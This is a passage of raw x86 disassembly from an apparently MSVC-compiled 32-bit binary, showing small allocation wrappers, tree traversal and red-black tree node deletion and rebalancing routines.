   138db:	mov    esi,DWORD PTR [esi]
   138dd:	push   edi
   138de:	call   0x1d9f8
   138e3:	pop    ecx
   138e4:	mov    edi,esi
   138e6:	cmp    esi,DWORD PTR ds:0x7f8b8
   138ec:	jne    0x138d1
   138ee:	pop    edi
   138ef:	pop    esi
   138f0:	pop    ebx
   138f1:	pop    ebp
   138f2:	ret    0x4
   138f5:	int3   
   138f6:	int3   
   138f7:	int3   
   138f8:	int3   
   138f9:	int3   
   138fa:	mov    edi,edi
   138fc:	push   ebp
   138fd:	mov    ebp,esp
   138ff:	push   ebx
   13900:	push   esi
   13901:	push   edi
   13902:	mov    edi,DWORD PTR [ebp+0x8]
   13905:	mov    ebx,ecx
   13907:	mov    esi,edi
   13909:	cmp    edi,DWORD PTR ds:0x7f8bc
   1390f:	je     0x1392e
   13911:	push   DWORD PTR [esi+0x8]
   13914:	mov    ecx,ebx
   13916:	call   0x138fa
   1391b:	mov    esi,DWORD PTR [esi]
   1391d:	push   edi
   1391e:	call   0x1d9f8
   13923:	pop    ecx
   13924:	mov    edi,esi
   13926:	cmp    esi,DWORD PTR ds:0x7f8bc
   1392c:	jne    0x13911
   1392e:	pop    edi
   1392f:	pop    esi
   13930:	pop    ebx
   13931:	pop    ebp
   13932:	ret    0x4
   13935:	int3   
   13936:	int3   
   13937:	int3   
   13938:	int3   
   13939:	int3   
   1393a:	mov    edi,edi
   1393c:	push   ebp
   1393d:	mov    ebp,esp
   1393f:	push   0x0
   13941:	push   0x18
   13943:	call   0x11604
   13948:	mov    ecx,DWORD PTR [ebp+0x8]
   1394b:	mov    DWORD PTR [eax+0x4],ecx
   1394e:	mov    ecx,DWORD PTR [ebp+0xc]
   13951:	mov    DWORD PTR [eax+0x14],ecx
   13954:	pop    ebp
   13955:	ret    0x8
   13958:	int3   
   13959:	int3   
   1395a:	int3   
   1395b:	int3   
   1395c:	int3   
   1395d:	int3   
   1395e:	mov    edi,edi
   13960:	push   ebp
   13961:	mov    ebp,esp
   13963:	push   0x0
   13965:	push   0x70
   13967:	call   0x11604
   1396c:	mov    ecx,DWORD PTR [ebp+0x8]
   1396f:	mov    DWORD PTR [eax+0x4],ecx
   13972:	mov    ecx,DWORD PTR [ebp+0xc]
   13975:	mov    DWORD PTR [eax+0x68],ecx
   13978:	pop    ebp
   13979:	ret    0x8
   1397c:	int3   
   1397d:	int3   
   1397e:	int3   
   1397f:	int3   
   13980:	int3   
   13981:	int3   
   13982:	mov    edi,edi
   13984:	push   ebp
   13985:	mov    ebp,esp
   13987:	push   0x0
   13989:	push   0x14
   1398b:	call   0x11604
   13990:	mov    ecx,DWORD PTR [ebp+0x8]
   13993:	mov    DWORD PTR [eax+0x4],ecx
   13996:	mov    ecx,DWORD PTR [ebp+0xc]
   13999:	mov    DWORD PTR [eax+0x10],ecx
   1399c:	pop    ebp
   1399d:	ret    0x8
   139a0:	int3   
   139a1:	int3   
   139a2:	int3   
   139a3:	int3   
   139a4:	int3   
   139a5:	int3   
   139a6:	mov    edi,edi
   139a8:	push   ebp
   139a9:	mov    ebp,esp
   139ab:	push   0x0
   139ad:	push   0x78
   139af:	call   0x11604
   139b4:	mov    ecx,DWORD PTR [ebp+0x8]
   139b7:	mov    DWORD PTR [eax+0x4],ecx
   139ba:	mov    ecx,DWORD PTR [ebp+0xc]
   139bd:	mov    DWORD PTR [eax+0x70],ecx
   139c0:	pop    ebp
   139c1:	ret    0x8
   139c4:	int3   
   139c5:	int3   
   139c6:	int3   
   139c7:	int3   
   139c8:	int3   
   139c9:	int3   
   139ca:	mov    edi,edi
   139cc:	push   ebp
   139cd:	mov    ebp,esp
   139cf:	push   0x0
   139d1:	push   0x20
   139d3:	call   0x11604
   139d8:	mov    ecx,DWORD PTR [ebp+0x8]
   139db:	mov    DWORD PTR [eax+0x4],ecx
   139de:	mov    ecx,DWORD PTR [ebp+0xc]
   139e1:	mov    DWORD PTR [eax+0x1c],ecx
   139e4:	pop    ebp
   139e5:	ret    0x8
   139e8:	int3   
   139e9:	int3   
   139ea:	int3   
   139eb:	int3   
   139ec:	int3   
   139ed:	int3   
   139ee:	mov    edi,edi
   139f0:	push   ebp
   139f1:	mov    ebp,esp
   139f3:	push   ecx
   139f4:	push   DWORD PTR [ebp-0x4]
   139f7:	push   DWORD PTR [ebp+0x10]
   139fa:	push   DWORD PTR [ebp+0xc]
   139fd:	push   DWORD PTR [ebp+0x8]
   13a00:	call   0x1360e
   13a05:	add    esp,0x10
   13a08:	leave  
   13a09:	ret    
   13a0a:	int3   
   13a0b:	int3   
   13a0c:	int3   
   13a0d:	int3   
   13a0e:	int3   
   13a0f:	int3   
   13a10:	mov    edi,edi
   13a12:	push   ebp
   13a13:	mov    ebp,esp
   13a15:	push   ecx
   13a16:	push   DWORD PTR [ebp-0x4]
   13a19:	push   DWORD PTR [ebp+0x10]
   13a1c:	push   DWORD PTR [ebp+0xc]
   13a1f:	push   DWORD PTR [ebp+0x8]
   13a22:	call   0x13638
   13a27:	add    esp,0x10
   13a2a:	leave  
   13a2b:	ret    
   13a2c:	int3   
   13a2d:	int3   
   13a2e:	int3   
   13a2f:	int3   
   13a30:	int3   
   13a31:	int3   
   13a32:	mov    edi,edi
   13a34:	push   ebp
   13a35:	mov    ebp,esp
   13a37:	push   ecx
   13a38:	push   DWORD PTR [ebp-0x4]
   13a3b:	push   DWORD PTR [ebp+0x10]
   13a3e:	push   DWORD PTR [ebp+0xc]
   13a41:	push   DWORD PTR [ebp+0x8]
   13a44:	call   0x13662
   13a49:	add    esp,0x10
   13a4c:	leave  
   13a4d:	ret    
   13a4e:	int3   
   13a4f:	int3   
   13a50:	int3   
   13a51:	int3   
   13a52:	int3   
   13a53:	int3   
   13a54:	mov    edi,edi
   13a56:	push   ebp
   13a57:	mov    ebp,esp
   13a59:	push   ecx
   13a5a:	push   DWORD PTR [ebp-0x4]
   13a5d:	push   DWORD PTR [ebp+0x10]
   13a60:	push   DWORD PTR [ebp+0xc]
   13a63:	push   DWORD PTR [ebp+0x8]
   13a66:	call   0x1368c
   13a6b:	add    esp,0x10
   13a6e:	leave  
   13a6f:	ret    
   13a70:	int3   
   13a71:	int3   
   13a72:	int3   
   13a73:	int3   
   13a74:	int3   
   13a75:	int3   
   13a76:	mov    edi,edi
   13a78:	push   ebp
   13a79:	mov    ebp,esp
   13a7b:	mov    ecx,DWORD PTR [ebp+0x8]
   13a7e:	test   ecx,ecx
   13a80:	je     0x13a8a
   13a82:	push   DWORD PTR [ebp+0xc]
   13a85:	call   0x134c2
   13a8a:	pop    ebp
   13a8b:	ret    0x8
   13a8e:	int3   
   13a8f:	int3   
   13a90:	int3   
   13a91:	int3   
   13a92:	int3   
   13a93:	int3   
   13a94:	mov    edi,edi
   13a96:	push   ebp
   13a97:	mov    ebp,esp
   13a99:	mov    ecx,DWORD PTR [ebp+0x8]
   13a9c:	push   0x0
   13a9e:	call   0x134ee
   13aa3:	pop    ebp
   13aa4:	ret    0x4
   13aa7:	int3   
   13aa8:	int3   
   13aa9:	int3   
   13aaa:	int3   
   13aab:	int3   
   13aac:	mov    edi,edi
   13aae:	push   ebp
   13aaf:	mov    ebp,esp
   13ab1:	mov    ecx,DWORD PTR [ebp+0x8]
   13ab4:	test   ecx,ecx
   13ab6:	je     0x13ac0
   13ab8:	push   DWORD PTR [ebp+0xc]
   13abb:	call   0x13514
   13ac0:	pop    ebp
   13ac1:	ret    0x8
   13ac4:	int3   
   13ac5:	int3   
   13ac6:	int3   
   13ac7:	int3   
   13ac8:	int3   
   13ac9:	int3   
   13aca:	mov    edi,edi
   13acc:	push   ebp
   13acd:	mov    ebp,esp
   13acf:	mov    ecx,DWORD PTR [ebp+0x8]
   13ad2:	test   ecx,ecx
   13ad4:	je     0x13ade
   13ad6:	push   DWORD PTR [ebp+0xc]
   13ad9:	call   0x13458
   13ade:	pop    ebp
   13adf:	ret    0x8
   13ae2:	int3   
   13ae3:	int3   
   13ae4:	int3   
   13ae5:	int3   
   13ae6:	int3   
   13ae7:	int3   
   13ae8:	mov    edi,edi
   13aea:	push   ebp
   13aeb:	mov    ebp,esp
   13aed:	mov    ecx,DWORD PTR [ebp+0x8]
   13af0:	test   ecx,ecx
   13af2:	je     0x13afc
   13af4:	push   DWORD PTR [ebp+0xc]
   13af7:	call   0x13540
   13afc:	pop    ebp
   13afd:	ret    0x8
   13b00:	int3   
   13b01:	int3   
   13b02:	int3   
   13b03:	int3   
   13b04:	int3   
   13b05:	int3   
   13b06:	mov    edi,edi
   13b08:	push   ebp
   13b09:	mov    ebp,esp
   13b0b:	mov    ecx,DWORD PTR [ebp+0x8]
   13b0e:	push   0x0
   13b10:	call   0x13568
   13b15:	pop    ebp
   13b16:	ret    0x4
   13b19:	int3   
   13b1a:	int3   
   13b1b:	int3   
   13b1c:	int3   
   13b1d:	int3   
   13b1e:	mov    edi,edi
   13b20:	push   ebp
   13b21:	mov    ebp,esp
   13b23:	mov    ecx,DWORD PTR [ebp+0x8]
   13b26:	test   ecx,ecx
   13b28:	je     0x13b32
   13b2a:	push   DWORD PTR [ebp+0xc]
   13b2d:	call   0x1342c
   13b32:	pop    ebp
   13b33:	ret    0x8
   13b36:	int3   
   13b37:	int3   
   13b38:	int3   
   13b39:	int3   
   13b3a:	int3   
   13b3b:	int3   
   13b3c:	mov    edi,edi
   13b3e:	push   ebp
   13b3f:	mov    ebp,esp
   13b41:	push   ecx
   13b42:	mov    eax,ds:0x7f8bc
   13b47:	push   ebx
   13b48:	mov    ebx,DWORD PTR [ebp+0xc]
   13b4b:	push   esi
   13b4c:	mov    esi,DWORD PTR [ebp+0x8]
   13b4f:	mov    DWORD PTR [ebp-0x4],ecx
   13b52:	mov    DWORD PTR [ebp+0x8],esi
   13b55:	cmp    esi,eax
   13b57:	je     0x13b9c
   13b59:	push   edi
   13b5a:	push   DWORD PTR [esi+0x10]
   13b5d:	mov    ecx,DWORD PTR [ebp-0x4]
   13b60:	push   ebx
   13b61:	call   0x13982
   13b66:	mov    edi,eax
   13b68:	cmp    DWORD PTR [ebp+0x8],esi
   13b6b:	jne    0x13b70
   13b6d:	mov    DWORD PTR [ebp+0x8],edi
   13b70:	mov    ecx,DWORD PTR [ebp-0x4]
   13b73:	push   edi
   13b74:	push   DWORD PTR [esi+0x8]
   13b77:	call   0x13b3c
   13b7c:	mov    DWORD PTR [edi+0x8],eax
   13b7f:	lea    eax,[esi+0xc]
   13b82:	push   eax
   13b83:	lea    eax,[edi+0xc]
   13b86:	push   eax
   13b87:	call   0x1a344
   13b8c:	mov    DWORD PTR [ebx],edi
   13b8e:	mov    esi,DWORD PTR [esi]
   13b90:	mov    eax,ds:0x7f8bc
   13b95:	mov    ebx,edi
   13b97:	cmp    esi,eax
   13b99:	jne    0x13b5a
   13b9b:	pop    edi
   13b9c:	mov    DWORD PTR [ebx],eax
   13b9e:	mov    eax,DWORD PTR [ebp+0x8]
   13ba1:	pop    esi
   13ba2:	pop    ebx
   13ba3:	leave  
   13ba4:	ret    0x8
   13ba7:	int3   
   13ba8:	int3   
   13ba9:	int3   
   13baa:	int3   
   13bab:	int3   
   13bac:	mov    edi,edi
   13bae:	push   ebp
   13baf:	mov    ebp,esp
   13bb1:	push   ecx
   13bb2:	push   esi
   13bb3:	push   edi
   13bb4:	mov    edi,DWORD PTR [ebp+0xc]
   13bb7:	push   edi
   13bb8:	mov    esi,ecx
   13bba:	call   0x12cbc
   13bbf:	mov    esi,DWORD PTR [esi+0x4]
   13bc2:	mov    DWORD PTR [ebp+0xc],eax
   13bc5:	cmp    eax,esi
   13bc7:	je     0x13bd5
   13bc9:	mov    ecx,DWORD PTR [edi]
   13bcb:	cmp    ecx,DWORD PTR [eax+0xc]
   13bce:	jb     0x13bd5
   13bd0:	lea    eax,[ebp+0xc]
   13bd3:	jmp    0x13bdb
   13bd5:	mov    DWORD PTR [ebp-0x4],esi
   13bd8:	lea    eax,[ebp-0x4]
   13bdb:	mov    ecx,DWORD PTR [eax]
   13bdd:	mov    eax,DWORD PTR [ebp+0x8]
   13be0:	pop    edi
   13be1:	mov    DWORD PTR [eax],ecx
   13be3:	pop    esi
   13be4:	leave  
   13be5:	ret    0x8
   13be8:	int3   
   13be9:	int3   
   13bea:	int3   
   13beb:	int3   
   13bec:	int3   
   13bed:	int3   
   13bee:	mov    edi,edi
   13bf0:	push   ebp
   13bf1:	mov    ebp,esp
   13bf3:	push   ecx
   13bf4:	push   esi
   13bf5:	push   DWORD PTR [ebp+0xc]
   13bf8:	mov    esi,ecx
   13bfa:	call   0x12d92
   13bff:	mov    DWORD PTR [ebp-0x4],eax
   13c02:	cmp    eax,DWORD PTR [esi+0x4]
   13c05:	je     0x13c1c
   13c07:	add    eax,0x10
   13c0a:	push   eax
   13c0b:	push   DWORD PTR [ebp+0xc]
   13c0e:	call   0x19790
   13c13:	test   al,al
   13c15:	jne    0x13c1c
   13c17:	lea    eax,[ebp-0x4]
   13c1a:	jmp    0x13c25
   13c1c:	mov    eax,DWORD PTR [esi+0x4]
   13c1f:	mov    DWORD PTR [ebp+0xc],eax
   13c22:	lea    eax,[ebp+0xc]
   13c25:	mov    ecx,DWORD PTR [eax]
   13c27:	mov    eax,DWORD PTR [ebp+0x8]
   13c2a:	mov    DWORD PTR [eax],ecx
   13c2c:	pop    esi
   13c2d:	leave  
   13c2e:	ret    0x8
   13c31:	int3   
   13c32:	int3   
   13c33:	int3   
   13c34:	int3   
   13c35:	int3   
   13c36:	mov    edi,edi
   13c38:	push   ebp
   13c39:	mov    ebp,esp
   13c3b:	push   ecx
   13c3c:	push   esi
   13c3d:	push   DWORD PTR [ebp+0xc]
   13c40:	mov    esi,ecx
   13c42:	call   0x12dd2
   13c47:	mov    DWORD PTR [ebp-0x4],eax
   13c4a:	cmp    eax,DWORD PTR [esi+0x4]
   13c4d:	je     0x13c64
   13c4f:	add    eax,0xc
   13c52:	push   eax
   13c53:	push   DWORD PTR [ebp+0xc]
   13c56:	call   0x19790
   13c5b:	test   al,al
   13c5d:	jne    0x13c64
   13c5f:	lea    eax,[ebp-0x4]
   13c62:	jmp    0x13c6d
   13c64:	mov    eax,DWORD PTR [esi+0x4]
   13c67:	mov    DWORD PTR [ebp+0xc],eax
   13c6a:	lea    eax,[ebp+0xc]
   13c6d:	mov    ecx,DWORD PTR [eax]
   13c6f:	mov    eax,DWORD PTR [ebp+0x8]
   13c72:	mov    DWORD PTR [eax],ecx
   13c74:	pop    esi
   13c75:	leave  
   13c76:	ret    0x8
   13c79:	int3   
   13c7a:	int3   
   13c7b:	int3   
   13c7c:	int3   
   13c7d:	int3   
   13c7e:	mov    edi,edi
   13c80:	push   ebp
   13c81:	mov    ebp,esp
   13c83:	push   ecx
   13c84:	push   esi
   13c85:	push   edi
   13c86:	mov    edi,DWORD PTR [ebp+0xc]
   13c89:	push   edi
   13c8a:	mov    esi,ecx
   13c8c:	call   0x12e12
   13c91:	mov    esi,DWORD PTR [esi+0x4]
   13c94:	mov    DWORD PTR [ebp+0xc],eax
   13c97:	cmp    eax,esi
   13c99:	je     0x13ca7
   13c9b:	mov    ecx,DWORD PTR [edi]
   13c9d:	cmp    ecx,DWORD PTR [eax+0xc]
   13ca0:	jl     0x13ca7
   13ca2:	lea    eax,[ebp+0xc]
   13ca5:	jmp    0x13cad
   13ca7:	mov    DWORD PTR [ebp-0x4],esi
   13caa:	lea    eax,[ebp-0x4]
   13cad:	mov    ecx,DWORD PTR [eax]
   13caf:	mov    eax,DWORD PTR [ebp+0x8]
   13cb2:	pop    edi
   13cb3:	mov    DWORD PTR [eax],ecx
   13cb5:	pop    esi
   13cb6:	leave  
   13cb7:	ret    0x8
   13cba:	int3   
   13cbb:	int3   
   13cbc:	int3   
   13cbd:	int3   
   13cbe:	int3   
   13cbf:	int3   
   13cc0:	mov    edi,edi
   13cc2:	push   ebp
   13cc3:	mov    ebp,esp
   13cc5:	push   ecx
   13cc6:	mov    eax,DWORD PTR [ecx]
   13cc8:	lea    ecx,[ebp-0x4]
   13ccb:	mov    DWORD PTR [ebp-0x4],eax
   13cce:	call   0x12e80
   13cd3:	mov    eax,DWORD PTR [ebp-0x4]
   13cd6:	add    eax,0xc
   13cd9:	leave  
   13cda:	ret    
   13cdb:	int3   
   13cdc:	int3   
   13cdd:	int3   
   13cde:	int3   
   13cdf:	int3   
   13ce0:	mov    edi,edi
   13ce2:	push   ebp
   13ce3:	mov    ebp,esp
   13ce5:	push   ecx
   13ce6:	push   esi
   13ce7:	push   DWORD PTR [ebp+0xc]
   13cea:	mov    esi,ecx
   13cec:	call   0x12f94
   13cf1:	mov    DWORD PTR [ebp-0x4],eax
   13cf4:	cmp    eax,DWORD PTR [esi+0x4]
   13cf7:	je     0x13d0e
   13cf9:	add    eax,0x10
   13cfc:	push   eax
   13cfd:	push   DWORD PTR [ebp+0xc]
   13d00:	call   0x19790
   13d05:	test   al,al
   13d07:	jne    0x13d0e
   13d09:	lea    eax,[ebp-0x4]
   13d0c:	jmp    0x13d17
   13d0e:	mov    eax,DWORD PTR [esi+0x4]
   13d11:	mov    DWORD PTR [ebp+0xc],eax
   13d14:	lea    eax,[ebp+0xc]
   13d17:	mov    ecx,DWORD PTR [eax]
   13d19:	mov    eax,DWORD PTR [ebp+0x8]
   13d1c:	mov    DWORD PTR [eax],ecx
   13d1e:	pop    esi
   13d1f:	leave  
   13d20:	ret    0x8
   13d23:	int3   
   13d24:	int3   
   13d25:	int3   
   13d26:	int3   
   13d27:	int3   
   13d28:	mov    edi,edi
   13d2a:	push   ebp
   13d2b:	mov    ebp,esp
   13d2d:	push   ecx
   13d2e:	push   ecx
   13d2f:	push   ebx
   13d30:	push   esi
   13d31:	mov    DWORD PTR [ebp-0x4],ecx
   13d34:	push   edi
   13d35:	mov    edi,DWORD PTR [ebp+0xc]
   13d38:	lea    ecx,[ebp+0xc]
   13d3b:	call   0x112b6
   13d40:	mov    esi,DWORD PTR [edi]
   13d42:	mov    eax,ds:0x7f8b8
   13d47:	mov    ebx,edi
   13d49:	mov    DWORD PTR [ebp-0x8],esi
   13d4c:	cmp    esi,eax
   13d4e:	jne    0x13d6c
   13d50:	mov    esi,DWORD PTR [edi+0x8]
   13d53:	mov    eax,DWORD PTR [ebx+0x4]
   13d56:	mov    ecx,DWORD PTR [ebp-0x4]
   13d59:	mov    DWORD PTR [esi+0x4],eax
   13d5c:	mov    eax,DWORD PTR [ecx+0x4]
   13d5f:	cmp    DWORD PTR [eax+0x4],edi
   13d62:	jne    0x13de1
   13d64:	mov    DWORD PTR [eax+0x4],esi
   13d67:	jmp    0x13def
   13d6c:	mov    ecx,DWORD PTR [edi+0x8]
   13d6f:	cmp    ecx,eax
   13d71:	je     0x13d53
   13d73:	push   ecx
   13d74:	call   0x111cc
   13d79:	mov    ebx,eax
   13d7b:	mov    esi,DWORD PTR [ebx+0x8]
   13d7e:	cmp    ebx,edi
   13d80:	je     0x13d53
   13d82:	mov    eax,DWORD PTR [ebp-0x8]
   13d85:	mov    DWORD PTR [eax+0x4],ebx
   13d88:	mov    eax,DWORD PTR [edi]
   13d8a:	mov    DWORD PTR [ebx],eax
   13d8c:	cmp    ebx,DWORD PTR [edi+0x8]
   13d8f:	jne    0x13d96
   13d91:	mov    DWORD PTR [esi+0x4],ebx
   13d94:	jmp    0x13dad
   13d96:	mov    eax,DWORD PTR [ebx+0x4]
   13d99:	mov    DWORD PTR [esi+0x4],eax
   13d9c:	mov    eax,DWORD PTR [ebx+0x4]
   13d9f:	mov    DWORD PTR [eax],esi
   13da1:	mov    eax,DWORD PTR [edi+0x8]
   13da4:	mov    DWORD PTR [ebx+0x8],eax
   13da7:	mov    eax,DWORD PTR [edi+0x8]
   13daa:	mov    DWORD PTR [eax+0x4],ebx
   13dad:	mov    eax,DWORD PTR [ebp-0x4]
   13db0:	mov    eax,DWORD PTR [eax+0x4]
   13db3:	cmp    DWORD PTR [eax+0x4],edi
   13db6:	jne    0x13dbd
   13db8:	mov    DWORD PTR [eax+0x4],ebx
   13dbb:	jmp    0x13dcb
   13dbd:	mov    eax,DWORD PTR [edi+0x4]
   13dc0:	cmp    DWORD PTR [eax],edi
   13dc2:	jne    0x13dc8
   13dc4:	mov    DWORD PTR [eax],ebx
   13dc6:	jmp    0x13dcb
   13dc8:	mov    DWORD PTR [eax+0x8],ebx
   13dcb:	mov    eax,DWORD PTR [edi+0x4]
   13dce:	mov    DWORD PTR [ebx+0x4],eax
   13dd1:	mov    eax,DWORD PTR [ebx+0x14]
   13dd4:	mov    ecx,DWORD PTR [edi+0x14]
   13dd7:	mov    DWORD PTR [ebx+0x14],ecx
   13dda:	mov    DWORD PTR [edi+0x14],eax
   13ddd:	mov    ebx,edi
   13ddf:	jmp    0x13e42
   13de1:	mov    eax,DWORD PTR [edi+0x4]
   13de4:	cmp    DWORD PTR [eax],edi
   13de6:	jne    0x13dec
   13de8:	mov    DWORD PTR [eax],esi
   13dea:	jmp    0x13def
   13dec:	mov    DWORD PTR [eax+0x8],esi
   13def:	mov    eax,DWORD PTR [ecx+0x4]
   13df2:	mov    DWORD PTR [ebp-0x8],eax
   13df5:	cmp    DWORD PTR [eax],edi
   13df7:	jne    0x13e19
   13df9:	mov    edx,DWORD PTR [edi+0x8]
   13dfc:	cmp    edx,DWORD PTR ds:0x7f8b8
   13e02:	jne    0x13e0b
   13e04:	mov    edx,DWORD PTR [edi+0x4]
   13e07:	mov    DWORD PTR [eax],edx
   13e09:	jmp    0x13e19
   13e0b:	push   esi
   13e0c:	call   0x111cc
   13e11:	mov    ecx,DWORD PTR [ebp-0x8]
   13e14:	mov    DWORD PTR [ecx],eax
   13e16:	mov    ecx,DWORD PTR [ebp-0x4]
   13e19:	mov    eax,DWORD PTR [ecx+0x4]
   13e1c:	mov    DWORD PTR [ebp-0x8],eax
   13e1f:	cmp    DWORD PTR [eax+0x8],edi
   13e22:	jne    0x13e42
   13e24:	mov    ecx,DWORD PTR [edi]
   13e26:	cmp    ecx,DWORD PTR ds:0x7f8b8
   13e2c:	jne    0x13e36
   13e2e:	mov    ecx,DWORD PTR [edi+0x4]
   13e31:	mov    DWORD PTR [eax+0x8],ecx
   13e34:	jmp    0x13e42
   13e36:	push   esi
   13e37:	call   0x111aa
   13e3c:	mov    ecx,DWORD PTR [ebp-0x8]
   13e3f:	mov    DWORD PTR [ecx+0x8],eax
   13e42:	xor    edi,edi
   13e44:	inc    edi
   13e45:	cmp    DWORD PTR [ebx+0x14],edi
   13e48:	jne    0x13f5f
   13e4e:	jmp    0x13f0d
   13e53:	cmp    DWORD PTR [esi+0x14],edi
   13e56:	jne    0x13f5c
   13e5c:	mov    eax,DWORD PTR [esi+0x4]
   13e5f:	cmp    esi,DWORD PTR [eax]
   13e61:	jne    0x13ed8
   13e63:	mov    eax,DWORD PTR [eax+0x8]
   13e66:	cmp    DWORD PTR [eax+0x14],0x0
   13e6a:	jne    0x13e84
   13e6c:	mov    DWORD PTR [eax+0x14],edi
   13e6f:	mov    eax,DWORD PTR [esi+0x4]
   13e72:	and    DWORD PTR [eax+0x14],0x0
   13e76:	push   DWORD PTR [esi+0x4]
   13e79:	call   0x12cf4
   13e7e:	mov    eax,DWORD PTR [esi+0x4]
   13e81:	mov    eax,DWORD PTR [eax+0x8]
   13e84:	mov    ecx,DWORD PTR [eax]
   13e86:	cmp    DWORD PTR [ecx+0x14],edi
   13e89:	jne    0x13e93
   13e8b:	mov    ecx,DWORD PTR [eax+0x8]
   13e8e:	cmp    DWORD PTR [ecx+0x14],edi
   13e91:	je     0x13f06
   13e93:	mov    ecx,DWORD PTR [eax+0x8]
   13e96:	cmp    DWORD PTR [ecx+0x14],edi
   13e99:	jne    0x13eb3
   13e9b:	mov    ecx,DWORD PTR [eax]
   13e9d:	mov    DWORD PTR [ecx+0x14],edi
   13ea0:	mov    ecx,DWORD PTR [ebp-0x4]
   13ea3:	and    DWORD PTR [eax+0x14],0x0
   13ea7:	push   eax
   13ea8:	call   0x12d42
   13ead:	mov    eax,DWORD PTR [esi+0x4]
   13eb0:	mov    eax,DWORD PTR [eax+0x8]
   13eb3:	mov    ecx,DWORD PTR [esi+0x4]
   13eb6:	mov    ecx,DWORD PTR [ecx+0x14]
   13eb9:	mov    DWORD PTR [eax+0x14],ecx
   13ebc:	mov    ecx,DWORD PTR [esi+0x4]
   13ebf:	mov    DWORD PTR [ecx+0x14],edi
   13ec2:	mov    eax,DWORD PTR [eax+0x8]
   13ec5:	mov    ecx,DWORD PTR [ebp-0x4]
   13ec8:	mov    DWORD PTR [eax+0x14],edi
   13ecb:	push   DWORD PTR [esi+0x4]
   13ece:	call   0x12cf4
   13ed3:	jmp    0x13f5c
   13ed8:	mov    eax,DWORD PTR [eax]
   13eda:	cmp    DWORD PTR [eax+0x14],0x0
   13ede:	jne    0x13ef7
   13ee0:	mov    DWORD PTR [eax+0x14],edi
   13ee3:	mov    eax,DWORD PTR [esi+0x4]
   13ee6:	and    DWORD PTR [eax+0x14],0x0
   13eea:	push   DWORD PTR [esi+0x4]
   13eed:	call   0x12d42
   13ef2:	mov    eax,DWORD PTR [esi+0x4]
   13ef5:	mov    eax,DWORD PTR [eax]
   13ef7:	mov    ecx,DWORD PTR [eax+0x8]
   13efa:	cmp    DWORD PTR [ecx+0x14],edi
   13efd:	jne    0x13f1e
   13eff:	mov    ecx,DWORD PTR [eax]
   13f01:	cmp    DWORD PTR [ecx+0x14],edi
   13f04:	jne    0x13f1e
   13f06:	and    DWORD PTR [eax+0x14],0x0
   13f0a:	mov    esi,DWORD PTR [esi+0x4]
   13f0d:	mov    ecx,DWORD PTR [ebp-0x4]
   13f10:	mov    eax,DWORD PTR [ecx+0x4]
   13f13:	cmp    esi,DWORD PTR [eax+0x4]
   13f16:	jne    0x13e53
   13f1c:	jmp    0x13f5c
   13f1e:	mov    ecx,DWORD PTR [eax]
   13f20:	cmp    DWORD PTR [ecx+0x14],edi
   13f23:	jne    0x13f3d
   13f25:	mov    ecx,DWORD PTR [eax+0x8]
   13f28:	mov    DWORD PTR [ecx+0x14],edi
   13f2b:	mov    ecx,DWORD PTR [ebp-0x4]
   13f2e:	and    DWORD PTR [eax+0x14],0x0
   13f32:	push   eax
   13f33:	call   0x12cf4
   13f38:	mov    eax,DWORD PTR [esi+0x4]
   13f3b:	mov    eax,DWORD PTR [eax]
   13f3d:	mov    ecx,DWORD PTR [esi+0x4]
   13f40:	mov    ecx,DWORD PTR [ecx+0x14]
   13f43:	mov    DWORD PTR [eax+0x14],ecx
   13f46:	mov    ecx,DWORD PTR [esi+0x4]
   13f49:	mov    DWORD PTR [ecx+0x14],edi
   13f4c:	mov    eax,DWORD PTR [eax]
   13f4e:	mov    ecx,DWORD PTR [ebp-0x4]
   13f51:	mov    DWORD PTR [eax+0x14],edi
   13f54:	push   DWORD PTR [esi+0x4]
   13f57:	call   0x12d42
   13f5c:	mov    DWORD PTR [esi+0x14],edi
   13f5f:	push   ebx
   13f60:	call   0x1d9f8
   13f65:	mov    eax,DWORD PTR [ebp-0x4]
   13f68:	dec    DWORD PTR [eax+0xc]
   13f6b:	mov    eax,DWORD PTR [ebp+0x8]
   13f6e:	pop    ecx
   13f6f:	mov    ecx,DWORD PTR [ebp+0xc]
   13f72:	pop    edi
   13f73:	pop    esi
   13f74:	mov    DWORD PTR [eax],ecx
   13f76:	pop    ebx
   13f77:	leave  
   13f78:	ret    0x8
   13f7b:	int3   
   13f7c:	int3   
   13f7d:	int3   
   13f7e:	int3   
   13f7f:	int3   
   13f80:	mov    edi,edi
   13f82:	push   ebp
   13f83:	mov    ebp,esp
   13f85:	push   esi
   13f86:	push   edi
   13f87:	push   DWORD PTR [ebp+0xc]
   13f8a:	mov    edi,ecx
   13f8c:	call   0x13072
   13f91:	push   DWORD PTR [ebp+0xc]
   13f94:	mov    ecx,edi
   13f96:	mov    esi,eax
   13f98:	call   0x12cbc
   13f9d:	mov    ecx,DWORD PTR [ebp+0x8]
   13fa0:	pop    edi
   13fa1:	mov    DWORD PTR [ecx],eax
   13fa3:	mov    DWORD PTR [ecx+0x4],esi
   13fa6:	mov    eax,ecx
   13fa8:	pop    esi
   13fa9:	pop    ebp
   13faa:	ret    0x8
   13fad:	int3   
   13fae:	int3   
   13faf:	int3   
   13fb0:	int3   
   13fb1:	int3   
   13fb2:	mov    edi,edi
   13fb4:	push   esi
   13fb5:	push   edi
   13fb6:	push   0x1
   13fb8:	xor    edi,edi
   13fba:	push   edi
   13fbb:	mov    esi,ecx
   13fbd:	call   0x1393a
   13fc2:	cmp    DWORD PTR ds:0x7f8b8,edi
   13fc8:	jne    0x13fdf
   13fca:	mov    ecx,eax
   13fcc:	mov    DWORD PTR ds:0x7f8b8,ecx
   13fd2:	mov    DWORD PTR [ecx],edi
   13fd4:	mov    ecx,DWORD PTR ds:0x7f8b8
   13fda:	xor    eax,eax
   13fdc:	mov    DWORD PTR [ecx+0x8],edi
   13fdf:	inc    DWORD PTR ds:0x7fa10
   13fe5:	cmp    eax,edi
   13fe7:	je     0x13ff0
   13fe9:	push   eax
   13fea:	call   0x1d9f8
   13fef:	pop    ecx
   13ff0:	push   edi
   13ff1:	push   DWORD PTR ds:0x7f8b8
   13ff7:	mov    ecx,esi
   13ff9:	call   0x1393a
   13ffe:	mov    DWORD PTR [esi+0xc],edi
   14001:	mov    DWORD PTR [esi+0x4],eax
   14004:	mov    DWORD PTR [eax],eax
   14006:	mov    esi,DWORD PTR [esi+0x4]
   14009:	pop    edi
   1400a:	mov    DWORD PTR [esi+0x8],esi
   1400d:	pop    esi
   1400e:	ret    
   1400f:	int3   
   14010:	int3   
   14011:	int3   
   14012:	int3   
   14013:	int3   
   14014:	mov    edi,edi
   14016:	push   ebp
   14017:	mov    ebp,esp
